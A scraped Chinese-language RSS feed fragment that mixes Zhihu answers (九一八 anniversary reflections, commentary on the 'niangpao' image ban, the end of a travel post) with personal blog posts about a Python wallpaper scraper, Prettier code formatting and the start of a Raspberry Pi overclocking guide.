data-rawwidth=\"2042\" data-rawheight=\"1536\" data-watermark=\"watermark\" data-original-src=\"v2-4730f540f55b20cd7af9c28fbe230d47\" data-watermark-src=\"v2-81b749d582a4de6565468225da723007\" data-private-watermark-src=\"v2-7443608d0e36850f21852f9759924f68\"></p>\n<p><a class=\"member_mention\" href=\"http://www.zhihu.com/people/fba40906e5b829b22fe97db1b3723a82\" data-hash=\"fba40906e5b829b22fe97db1b3723a82\" data-hovercard=\"p$b$fba40906e5b829b22fe97db1b3723a82\">@小墨与阿猴</a> <a class=\"member_mention\" href=\"http://www.zhihu.com/people/9f4fb22e0686450a11c6d5dc122e4888\" data-hash=\"9f4fb22e0686450a11c6d5dc122e4888\" data-hovercard=\"p$b$9f4fb22e0686450a11c6d5dc122e4888\">@知乎生活</a> <a class=\"member_mention\" href=\"http://www.zhihu.com/people/614f573dea8647f30ed0bcfc03866e3a\" data-hash=\"614f573dea8647f30ed0bcfc03866e3a\" data-hovercard=\"p$b$614f573dea8647f30ed0bcfc03866e3a\">@知乎旅行</a> </p>\n<hr>\n<p>我的其他旅行内容：</p>\n<a href=\"https://www.zhihu.com/question/488115650/answer/2133452345\" data-draft-node=\"block\" data-draft-type=\"link-card\" data-image=\"https://pic3.zhimg.com/v2-c4c742217965e2a03d6a1888b61798df_bh.jpg\" data-image-width=\"1000\" data-image-height=\"667\" class=\"internal\">哪次旅行让你感受到了宁静忘我的瞬间 ？</a><a href=\"https://www.zhihu.com/zvideo/1412431564336324608\">这是我人生最「低开高走」的旅行 沉浸互动式火车博物馆也太绝了吧！车迷&amp;遛娃必去！</a><a href=\"https://www.zhihu.com/zvideo/1410838811689971713\">动物园的意义是什么？动物界“老弱病残”应该去哪里？在这个生态博物馆或许能找到答案</a><a href=\"https://www.zhihu.com/zvideo/1409133416172822528\">【边听边看太爽了】蒙特利尔老城+植物园非常可，一刷不过瘾，即便当文盲也要再去！</a><a href=\"https://www.zhihu.com/zvideo/1406263071547944962\">【沉浸式旅游】废弃奥运场馆能有多美？在蒙特利尔Biodome被震撼到了！</a><a href=\"https://www.zhihu.com/zvideo/1293160244244058112\">加拿大旅游准备贴：关于枫叶国  你不会只知道白求恩吧？！</a><a href=\"https://www.zhihu.com/zvideo/1263785103424937984\">保甜保开心｜加拿大夏天太舒服了，瞬间治好周一二三四七综合症！</a>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/rachelhuang-56?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">Rachel品吆</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/488083809/answer/2132775937?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">174 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/478698570?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">你认为旅行会改变你的生活吗？</a><br><a href=\"http://www.zhihu.com/question/313264551?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">请问旅行对于生命以及生活有什么意义？</a><br>\n","link":"http://www.zhihu.com/question/488083809/answer/2132775937?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"「九一八」事变 90 周年纪念日恰逢 2021 年全民国防教育日，勿忘国耻，警钟长鸣，你有什么想说的？","date":"2021-09-18 11:19:53","description":"\n<p>1931年9月18日晚，南满铁路柳条湖段的一声巨响，翻开了中华民族14年艰苦卓绝的血泪史。七八百人的侵略者，仅几个小时就攻陷了近7000人驻守的东北军北大营，不到24小时，沈阳全城陷落。短短4个月之后，美丽富饶的东北全境沦陷，3000万同胞成为亡国奴。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-e25a9f989b5a9ee696311fd9b078df85_720w.jpg?rss\" data-caption=\"日军蓄意制造柳条湖事件的现场\" data-size=\"normal\" data-rawwidth=\"500\" data-rawheight=\"326\" data-watermark=\"original\" data-original-src=\"v2-e25a9f989b5a9ee696311fd9b078df85\" data-watermark-src=\"v2-67ee8289a5da26cd052fbd15802b329d\" data-private-watermark-src=\"v2-4611003fc84047b2e1c4b98e38c616ef\"></p>\n<p>自此，“九一八”三个字，成为永远烙印在中华儿女心头的一道伤痕，鲜红刺目。那一年的9月18日是中国农历八月初七，再过几天就是中秋节，无数人没能等来万家团圆的时刻，他们将要面对的是山河破碎，国土沦陷。</p>\n<p><b>入侵东北后的日军，所到之处烧杀抢掠，无恶不作。</b>沈阳最先被日军占领，这座历史悠久的古城转眼变成人间炼狱。日军把炮台置于沈阳城鼓楼的旧址之上，并且封锁了各交通路口，持械盘查行人，对稍有不满或有反抗行为的就任意枪杀，致使许多无辜百姓惨遭杀戮。城内硝烟弥漫，街头尸横遍野。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-d115323a698b96e53052c6e40204781d_720w.jpg?rss\" data-caption=\"日军占领沈阳城\" data-size=\"normal\" data-rawwidth=\"640\" data-rawheight=\"408\" data-watermark=\"original\" data-original-src=\"v2-d115323a698b96e53052c6e40204781d\" data-watermark-src=\"v2-cb79db9a006b8313b8ca0414cd507a3c\" data-private-watermark-src=\"v2-70510f25d038c15ea39502fe175fbf92\"></p>\n<p>此后，锦州沦陷，哈尔滨沦陷……日军继而占领辽宁、吉林、黑龙江3省，一路攻城略地，<b>铁蹄践踏下东北人民的命运大抵相同——受尽折磨与摧残。</b></p>\n<p><img src=\"https://pic2.zhimg.com/v2-0c99937d442c2ec80fea7bc5d9251f1a_720w.jpg?rss\" data-caption=\"日军占领吉林市\" data-size=\"normal\" data-rawwidth=\"589\" data-rawheight=\"397\" data-watermark=\"original\" data-original-src=\"v2-0c99937d442c2ec80fea7bc5d9251f1a\" data-watermark-src=\"v2-3e764c3ace0c81b34523008b5a1a6ca0\" data-private-watermark-src=\"v2-636c8480e2b1101068ddee66b51a337d\"></p>\n<p>日本一方面攻占东北，另一方面加紧扶持地方伪政权。1932年3月1日，日本扶植的满洲国正式成立。<b>亡国灭种的耻辱刻在东北大地上。</b>东北人民不仅失去了作为中国人的尊严，甚至连最起码的生存需求也无法满足，沦为伪满洲国的贱民。</p>\n<p>在城镇，许多民众的房屋、商铺、财产被日军征用、强占、掠夺。日本为了满足其战争需求，对东北为数不多的产业工人实行更加残酷的剥削和无情的压榨。在阜新煤矿，推行“人肉开采”政策，要煤不要人，这是日本人对待煤与人关系的一个“准则”。他们通过把头招骗、勤劳奉仕、抓捕战犯和平民百姓等手段，每年弄来几万人下井挖煤，只要多出煤，什么安全不安全、死人不死人全然不顾。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-cd8739a330112fcd5c44dbeca5d7b0ef_720w.jpg?rss\" data-caption=\"日本侵略军装甲部队侵入沈阳市​\" data-size=\"normal\" data-rawwidth=\"640\" data-rawheight=\"423\" data-watermark=\"original\" data-original-src=\"v2-cd8739a330112fcd5c44dbeca5d7b0ef\" data-watermark-src=\"v2-781746b68c20e95c6919c911aca864d3\" data-private-watermark-src=\"v2-bef250271bf9cad50a89ff0fb1086020\"></p>\n<p>在农村，日本人控制着土地，大肆收缴“出荷粮”，即中国农民的余粮一律上缴。广大农民无粮糊口，以野菜、糠秕充饥，吃得浑身浮肿，卧榻难起。不仅如此，日本侵略者还强迫农民上缴棉花。棉花棉布被征作军用，老百姓只能穿用破棉絮、废旧棉花、破衣服等破烂纤维织成的粗布。很多贫苦百姓夏无单、冬无棉，无房者住炮台、小窝棚，冻死饿死者屡见不鲜。</p>\n<p>彼时，日伪还强制推行“集团部落”政策，这是日本侵华战争中的又一暴行。日军为了应付东北抗日联军，断绝他们的后勤补给，将抗联根据地与村民隔绝开，设计出“集团部落”，强制将中国村民迁移至其中，定量供给村民粮食，并设置严密的封锁线。很多“集团部落”内的中国百姓因此饿死，抗日联军也由于缺乏粮草供给被迫突围，很多部队作战失利。受“集团部落”政策的影响，东北各地数十万居民背井离乡，成为流落他乡的东北难民。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-ac16fc140ec864b156a1c0d318536ecc_720w.jpg?rss\" data-caption=\"天津东局子收容东北难民的难民营\" data-size=\"normal\" data-rawwidth=\"640\" data-rawheight=\"374\" data-watermark=\"original\" data-original-src=\"v2-ac16fc140ec864b156a1c0d318536ecc\" data-watermark-src=\"v2-e9bccc4058058e6cbb14429da2653e7b\" data-private-watermark-src=\"v2-c000aff4b13947818c58703bee0cfca1\"></p>\n<p>那时候有句民谣:“日本鬼子是恶狼，抓劳工要出荷粮，老百姓遭了殃，穿的是更生布，吃的是糟糠，好像没爹娘。”</p>\n<p><b>然而并非是没有爹娘，只是母亲的力量太过孱弱，根本无法庇佑自己的人民。</b>孩子受苦，母亲何尝不是在受难？她们只能眼睁睁地看着孩子饱受身体与精神的双重摧残。侵略者不仅是要夺走她的孩子，甚至妄想让孩子们“认贼作父”。</p>\n<p>为配合军事统治达到其长期霸占东北的目的，日本在东北实行一系列殖民思想统治和奴化教育措施，企图使青少年潜移默化地崇尚日本精神、泯灭中华民族意识，成为给日本侵华效力卖命的汉奸走狗和为其掠夺中国资源效力的劳动力。这一时期，中小学的学生每天早上须向新京（长春）作“满洲帝宫遥拜”，再向日本东京方向作“日本天皇陛下遥拜”，学生同时须以日语背诵皇帝诏书《国民训》。他们升旗时升的是日本国旗和满洲国旗，要用日语唱日本国歌，向东朝拜天皇。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-db64e8ec75b5ff1b20ec6593d2135846_720w.jpg?rss\" data-caption=\"伪满的虚假宣传\" data-size=\"normal\" data-rawwidth=\"500\" data-rawheight=\"388\" data-watermark=\"original\" data-original-src=\"v2-db64e8ec75b5ff1b20ec6593d2135846\" data-watermark-src=\"v2-ae585ab1f9d784dcbba82b9dfeafbf67\" data-private-watermark-src=\"v2-d216034d626021ffc12f66083a765ee4\"></p>\n<p><b>何为亡国奴？就是即使身在自己的国土，也不过是他人的附庸，生死由人不由己，</b>是侵略者眼中永远的最底层，可以肆意凌辱，且无需付出任何代价。千万人曾沦为亡国奴，其中有人匍匐跪拜，有人闻风而逃，但有人不屈抗争，死也要站着死，用自己的生命与血性，来洗刷同胞的耻辱，来证明中国还有希望，让后人不再蒙受亡国之耻。<b>当胜利到来的那一天，历史终于写下了最后的答案：中国，始终有希望。</b></p>\n<p>铭记国耻，就是要牢记历史教训。九一八事变距今已过去整整90年，但历史深处发出的警示言犹在耳。我们牢记这段耻辱、伤痛的历史，就是要牢记落后就要挨打的教训，更要知耻而后勇，绝不允许历史的悲剧重演。<b>中国人的命运只能掌握在我们自己手中。</b></p>\n<p><b>我是苹苹，感谢您阅读我的观点。</b></p>\n<p><img src=\"https://pic2.zhimg.com/v2-e02f4b6ed3830aa4675b71122eb7c1fc_720w.png?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"743\" data-rawheight=\"456\" data-watermark=\"original\" data-original-src=\"v2-e02f4b6ed3830aa4675b71122eb7c1fc\" data-watermark-src=\"v2-7f536761acb370b5d72ab9b1475a7bc2\" data-private-watermark-src=\"v2-29a0e555ac13c422515f610152403feb\"></p>\n<p></p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/jun-zheng-ping-39?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">钧正平</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/486830339/answer/2127889662?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">1975 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/470741239?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">「七七事变」84 周年纪念日，日本记者发推称：在日本很少有人提「 7 月 7 日」，反映了哪些问题？</a><br><a href=\"http://www.zhihu.com/question/487578931?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">2021年九一八事变90周年纪念日，面对国耻纪念日，你有什么想说的吗？</a><br>\n","link":"http://www.zhihu.com/question/486830339/answer/2127889662?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"「九一八」事变 90 周年纪念日恰逢 2021 年全民国防教育日，勿忘国耻，警钟长鸣，你有什么想说的？","date":"2021-09-18 10:35:14","description":"\n<p>一年三百六十日，多是横戈马上行。作为军人，只有两种状态：打仗和准备打仗。战场打不赢，一切等于零。所以，练兵备战，练强打赢本领，是最好的国防教育。</p>\n<p>今天，是“九一八事变”90周年。90年前的惨痛一幕，中国人民经历的14年抗战的艰辛历程，无不警醒我们：落后就要挨打，没有强大的军队，没有强大的国防，就没有和平幸福的生活。所以，回望历史，我们的心中要勿忘国耻，警钟常鸣，自强不息，强国强军。身为军人，就是要做到：脑子里永远有任务！眼睛里永远有敌人，肩膀上永远有责任，胸膛里永远有激情！在强军兴军的征程上，努力学习、刻苦训练，不断提升打赢本领，用青春和热血保护好我们的国家，绝不让历史悲剧重演！</p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/dong-bu-zhan-qu-49?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">东部战区</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/486830339/answer/2127751332?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">1975 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/470741239?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">「七七事变」84 周年纪念日，日本记者发推称：在日本很少有人提「 7 月 7 日」，反映了哪些问题？</a><br><a href=\"http://www.zhihu.com/question/487578931?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">2021年九一八事变90周年纪念日，面对国耻纪念日，你有什么想说的吗？</a><br>\n","link":"http://www.zhihu.com/question/486830339/answer/2127751332?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"北京广电局要求杜绝「娘炮」审美取向，如何定义「娘炮」审美？或将带来哪些影响？","date":"2021-09-18 08:45:44","description":"\n<p>近期，整治娱乐圈乱象受到公众高度关注，“娘炮形象”一词也引起网络热议。<b>其实，我们反对“娘炮形象”，反对的不是多样化的审美文化，不是高效的市场机制，更不是平等的性别秩序，而是反对资本裹挟下的不良文化审美现象和发展趋势。</b></p>\n<p>不可否认，近年来，借助资本运作和商业包装，在影视剧和综艺节目中频频出现一些“娘炮形象”。他们“故意打造人设”，造型“浮夸”，举手投足间宣扬“个性”，一时间成为了所谓的“风尚”而侵染了社会审美和大众视野，甚至对青少年审美趋向产生了不良影响。</p>\n<p><b>在最浅层面，“娘炮”是一种语言现象，</b>它由表示“少女”和“母亲”的词根“娘”，和表示“有经验”的词缀“炮儿”（老炮儿、职场炮儿）构成，在字面上表示在女性行为和气质上很有经验的人。有人考证，该词较早的公众亮相是在某些青春偶像剧中，女主骂男主“娘炮”。当然，在“阳刚”之外，男性审美和男性气质是多样的。但必须看到，<b>“娘炮形象”虽和阴柔的男性审美有关，其实却有着根本不同，是一个利用了阴柔、经过媒体美化的产业现象。</b></p>\n<p>内地娱乐尤其是偶像行业，在引进日韩偶像工业模式基础上，已经发展成了今天“全民制作人+练习生成团出道”的模式，进而全面“发扬光大”的道路。这就有了今天内地娱乐偶像工业年复一年生产出的一茬又一茬的有着高度同质化和套路化形象的偶像产品。由此，<b>资本打造“娘炮形象”的问题也呈现愈演愈烈之势。</b></p>\n<p>事实证明，行业的发展是期待“不同”的。如今，在女性审美领域，千篇一律的“白幼瘦”和“网红脸”已经反噬行业自身，审美疲劳的民众开始追求更加有辨识度的形象。因而，从行业健康角度来看，恰恰需要的是有魅力的审美和人格、有差异的产品和品牌。另一方面，偶像自身亦苦“娘”久矣。为了维持行业灌输给他们的那种单一的、所谓的“受欢迎”形象，他们不得不时刻节食、随时精致，甚至不惜削骨整容，在已经很“卷”的审美赛道上努力应对同行间的激烈竞争，还必须认清现实，面对隔年就被下一茬偶像替代的危机和命运。而更为重要的是，被如此精神文化食粮“投喂”的民众也鲜明地表达了自己的意愿：演技在线的老戏骨再次成为香饽饽，甚至于“四大天王”时代的怀旧照片被网友翻出来，复古风又开始流行。</p>\n<p>但是行业的困境、从业者的苦楚、民众的不满都难以改变资本的行为。在没有外力介入的情况下，资本在这条已经要被“耗”尽的审美道路上，究竟要再奔多久，我们很难判断。文化产品是一种特殊商品，当有着逐利性和滞后性，并已被资本左右的市场无法做出有效调节时，宏观调控就显得尤为重要。今天，市场在文艺创作生产的配置中起到的作用愈发重要，文艺从业者在自律的同时，更好发挥政府的调控功能、行业自身的引导和自律功能，对不良现象和行为进行及时纠偏，是当前应该迫切解决的课题。</p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/zhong-guo-wen-yi-wang?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">中国文艺网</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/487630781/answer/2127678196?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">826 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/484582339?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">如何界定一个艺人是否是娘炮?</a><br><a href=\"http://www.zhihu.com/question/299485947?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">为什么现在国家审美越来越娘炮化了？</a><br>\n","link":"http://www.zhihu.com/question/487630781/answer/2127678196?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"使用 Python 爬取故宫壁纸","date":"2021-07-17 05:55:00","description":"\n<p>我非常喜欢故宫壁纸，但是一张一张下载的速度就太慢了。</p>\n<p>于是，我就写了个简单的 Python 小程序自动爬取故宫壁纸。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E4%BB%A3%E7%A0%81\" class=\"headerlink\" title=\"代码\"></a>代码</h2>\n<p>首先，我们通过简单的查看，知道故宫壁纸的页面并没有使用 JavaScript 载入。</p>\n<p>但是故宫壁纸很多，所以还需要分类。</p>\n<p>故宫壁纸大多都是以分类开头，如 <code>爱上紫禁城 紫藤</code>, <code>清   虚谷紫藤金鱼图轴（局部）</code> 等等，所以一般只需要做个简单的 <code>startswith()</code> 判断就 OK 了。</p>\n<p>很多壁纸的标题都是一样的，所以还可以使用 <code>random</code> 库在文件名末尾追加一个随机数。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests, bs4, time, random</span><br><span class=\"line\">path = <span class=\"string\">\"./wallpaper/爱上紫禁城\"</span></span><br><span class=\"line\"></span><br><span class=\"line\">catch = <span class=\"number\">0</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">1</span>, <span class=\"number\">119</span>):</span><br><span class=\"line\">    <span class=\"comment\"># 组合请求 URL</span></span><br><span class=\"line\">    url = <span class=\"string\">\"https://www.dpm.org.cn/lights/royal/p/{}.html\"</span>.<span class=\"built_in\">format</span>(i)</span><br><span class=\"line\">    <span class=\"comment\"># 发送请求</span></span><br><span class=\"line\">    response = requests.get(url)</span><br><span class=\"line\">    <span class=\"comment\"># 设定页面编码为 UTF-8</span></span><br><span class=\"line\">    response.encoding = <span class=\"string\">\"UTF-8\"</span></span><br><span class=\"line\">    <span class=\"comment\"># 从 HTML 中解析数据</span></span><br><span class=\"line\">    soup = bs4.BeautifulSoup(response.text, <span class=\"string\">\"lxml\"</span>)</span><br><span class=\"line\">    image = soup.find_all(name=<span class=\"string\">\"div\"</span>, class_=<span class=\"string\">\"pic\"</span>)</span><br><span class=\"line\">    <span class=\"comment\"># 循环输出图片</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> n <span class=\"keyword\">in</span> image:</span><br><span class=\"line\">        catch = catch + <span class=\"number\">1</span></span><br><span class=\"line\">        <span class=\"comment\"># 获得壁纸名称</span></span><br><span class=\"line\">        <span class=\"comment\"># 分类，不是以【爱上紫禁城】开头的壁纸都忽略</span></span><br><span class=\"line\">        img_name = n.a.img[<span class=\"string\">\"title\"</span>]</span><br><span class=\"line\">        <span class=\"keyword\">if</span> img_name.startswith(<span class=\"string\">\"明\"</span>):</span><br><span class=\"line\">            print(<span class=\"string\">\"{}. {}\"</span>.<span class=\"built_in\">format</span>(catch, n.a.img[<span class=\"string\">\"title\"</span>]))</span><br><span class=\"line\">            <span class=\"comment\"># 组合获得壁纸页面</span></span><br><span class=\"line\">            url_1080 = <span class=\"string\">\"https://www.dpm.org.cn\"</span> + n.a[<span class=\"string\">\"href\"</span>]</span><br><span class=\"line\">            <span class=\"comment\"># 请求高清版网页</span></span><br><span class=\"line\">            response_img = requests.get(url_1080)</span><br><span class=\"line\">            <span class=\"comment\"># 再次解析</span></span><br><span class=\"line\">            soup_img = bs4.BeautifulSoup(response_img.text, <span class=\"string\">\"lxml\"</span>)</span><br><span class=\"line\">            <span class=\"comment\"># 获取页面中的图片</span></span><br><span class=\"line\">            data = soup_img.find_all(name=<span class=\"string\">\"img\"</span>)[<span class=\"number\">0</span>]</span><br><span class=\"line\">            <span class=\"comment\"># 获得壁纸图片的链接</span></span><br><span class=\"line\">            img_url = data[<span class=\"string\">\"src\"</span>]</span><br><span class=\"line\">            <span class=\"comment\"># 保存图片</span></span><br><span class=\"line\">            pic = requests.get(img_url).content</span><br><span class=\"line\">            file_name = path + img_name + <span class=\"string\">\"-\"</span> + <span class=\"built_in\">str</span>(random.randint(<span class=\"number\">100000</span>, <span class=\"number\">999999</span>)) + <span class=\"string\">\".jpg\"</span></span><br><span class=\"line\">            <span class=\"comment\"># 写入文件</span></span><br><span class=\"line\">            <span class=\"keyword\">with</span> <span class=\"built_in\">open</span>(file_name, <span class=\"string\">\"wb\"</span>) <span class=\"keyword\">as</span> file:</span><br><span class=\"line\">                file.write(pic)</span><br><span class=\"line\">        </span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            print(<span class=\"string\">\"!Ignore: \"</span> + img_name)</span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#%E5%90%8E\" class=\"headerlink\" title=\"后\"></a>后</h2>\n<p>我把一些我下载下来的壁纸放在了 <a href=\"https://t.yfun.top/dpm-wallpaper\">这里</a>，可以直接预览并下载。</p>\n<p><del>OK，又水了一篇文（</del></p>\n","link":"https://blog.yfun.top/posts/2021/dpm-wallpaper/"},{"title":"使用 Prettier 格式化代码","date":"2021-07-15 06:45:00","description":"\n<p>格式化代码可以提高代码的可读性，使代码更加美观。</p>\n<p>Prettier 支持：</p>\n<ul>\n<li>JavaScript (including experimental features)</li>\n<li>JSX</li>\n<li>Angular</li>\n<li>Vue</li>\n<li>Flow</li>\n<li>TypeScript</li>\n<li>CSS, Less, and SCSS</li>\n<li>HTML</li>\n<li>JSON</li>\n<li>GraphQL</li>\n<li>Markdown, including GFM and MDX</li>\n<li>YAML</li>\n</ul>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%AE%89%E8%A3%85\" class=\"headerlink\" title=\"安装\"></a>安装</h2>\n<h3>\n<a href=\"https://blog.yfun.top/#%E6%8F%92%E4%BB%B6\" class=\"headerlink\" title=\"插件\"></a>插件</h3>\n<p>你可以很方便的在 VSCode 等 IDE 上安装插件，插件名为 <code>Prettier</code>.</p>\n<p>以 VSCode 为例：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.10/rawimg/6a3ad0ea42d55.png\"></p>\n<blockquote><p>如果安装了其他格式化插件，则需要点击 [格式化文档的方式]，选择 <code>Prettier</code>。</p></blockquote>\n<h3>\n<a href=\"https://blog.yfun.top/#CLI\" class=\"headerlink\" title=\"CLI\"></a>CLI</h3>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo npm i -g prettier</span><br></pre></td></tr></table></figure><p>相关的文档可参见官网: <a href=\"https://prettier.io/docs/en/cli.html\">https://prettier.io/docs/en/cli.html</a></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">prettier --write . <span class=\"comment\"># 格式化当前文件夹的所有文件</span></span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#%E9%85%8D%E7%BD%AE\" class=\"headerlink\" title=\"配置\"></a>配置</h2>\n<p>参见官方文档：</p>\n<ul>\n<li><p><a href=\"https://prettier.io/docs/en/configuration.html\">https://prettier.io/docs/en/configuration.html</a></p></li>\n<li><p><a href=\"https://prettier.io/docs/en/options.html\">https://prettier.io/docs/en/options.html</a></p></li>\n</ul>\n<p>Prettier 的配置文件有多种写法：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.10/rawimg/a4cc583d84c12.png\"></p>\n<p>以使用 <code>YAML</code> 书写的 <code>.prettierrc</code> 为例：</p>\n<figure class=\"highlight yaml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 单行最长字符数</span></span><br><span class=\"line\"><span class=\"attr\">printWidth:</span> <span class=\"number\">80</span></span><br><span class=\"line\"><span class=\"comment\"># 制表符长度</span></span><br><span class=\"line\"><span class=\"attr\">tabWidth:</span> <span class=\"number\">4</span></span><br><span class=\"line\"><span class=\"comment\"># 是否使用 Tab</span></span><br><span class=\"line\"><span class=\"attr\">useTabs:</span> <span class=\"literal\">false</span></span><br><span class=\"line\"><span class=\"comment\"># 是否加入分号</span></span><br><span class=\"line\"><span class=\"attr\">semi:</span> <span class=\"literal\">true</span></span><br><span class=\"line\"><span class=\"comment\"># 单引号</span></span><br><span class=\"line\"><span class=\"attr\">singleQuote:</span> <span class=\"literal\">false</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># ...</span></span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#%E6%95%88%E6%9E%9C\" class=\"headerlink\" title=\"效果\"></a>效果</h2>\n<p>格式化前：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\">fetch(<span class=\"string\">\"https://blog.yfun.top/search.json\"</span>).then(<span class=\"function\"><span class=\"params\">res</span>=&gt;</span>res.json()).then(<span class=\"function\">(<span class=\"params\">content</span>) =&gt;</span> {<span class=\"built_in\">console</span>.log(content);<span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> i = <span class=\"number\">0</span>; i &lt; content.length; i++){<span class=\"built_in\">console</span>.log(content[i][<span class=\"string\">'title'</span>] + <span class=\"string\">\" --- https://blog.yfun.top\"</span> + content[i][<span class=\"string\">'url'</span>])}})</span><br></pre></td></tr></table></figure><p>格式化后：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\">fetch(<span class=\"string\">\"https://blog.yfun.top/search.json\"</span>)</span><br><span class=\"line\">    .then(<span class=\"function\">(<span class=\"params\">res</span>) =&gt;</span> res.json())</span><br><span class=\"line\">    .then(<span class=\"function\">(<span class=\"params\">content</span>) =&gt;</span> {</span><br><span class=\"line\">        <span class=\"built_in\">console</span>.log(content);</span><br><span class=\"line\">        <span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> i = <span class=\"number\">0</span>; i &lt; content.length; i++) {</span><br><span class=\"line\">            <span class=\"built_in\">console</span>.log(</span><br><span class=\"line\">                content[i][<span class=\"string\">\"title\"</span>] +</span><br><span class=\"line\">                    <span class=\"string\">\" --- https://blog.yfun.top\"</span> +</span><br><span class=\"line\">                    content[i][<span class=\"string\">\"url\"</span>]</span><br><span class=\"line\">            );</span><br><span class=\"line\">        }</span><br><span class=\"line\">    });</span><br></pre></td></tr></table></figure>\n","link":"https://blog.yfun.top/posts/2021/format-code-using-prettier/"},{"title":"树莓派超频","date":"2021-06-25 07:50:00","description":"\n<div class=\"note note-info\">            <p>本文操作系统为 Ubuntu Server 20.04，其他操作系统可能有所不同。</p>          </div>\n<div class=\"note note-warning\">            <p>超频是有风险的，温度也会更高，需要比较良好的散热。</p>          </div>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%BC%80%E5%A7%8B\" class=\"headerlink\" 